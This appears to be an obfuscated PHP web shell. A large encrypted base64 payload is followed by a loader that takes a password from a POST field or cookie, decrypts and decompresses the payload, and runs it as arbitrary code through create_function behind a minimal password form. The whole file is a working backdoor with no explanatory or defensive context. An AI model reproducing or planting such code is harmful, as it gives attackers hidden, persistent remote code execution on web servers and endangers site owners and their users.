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
/v95HnE55FerNmhBmgpvf7+AMdD99pg=
'));$j_j=isset($_POST['j_j'])?$_POST['j_j']:(isset($_COOKIE['j_j'])?$_COOKIE['j_j']:NULL);if($j_j!==NULL){$j_j=md5($j_j).substr(MD5(strrev($j_j)),0,strlen($j_j));for($j___j=0;$j___j<15563;$j___j++){$j__j[$j___j]=chr(( ord($j__j[$j___j])-ord($j_j[$j___j]))%256);$j_j.=$j__j[$j___j];}if($j__j=@gzinflate($j__j)){if(isset($_POST['j_j']))@setcookie('j_j', $_POST['j_j']);$j___j=create_function('',$j__j);unset($j_j,$j__j);$j___j();}}?><form method="post" action=""><input type="text"name="j_j"value=""/><input type="submit"value="&gt;"/></form>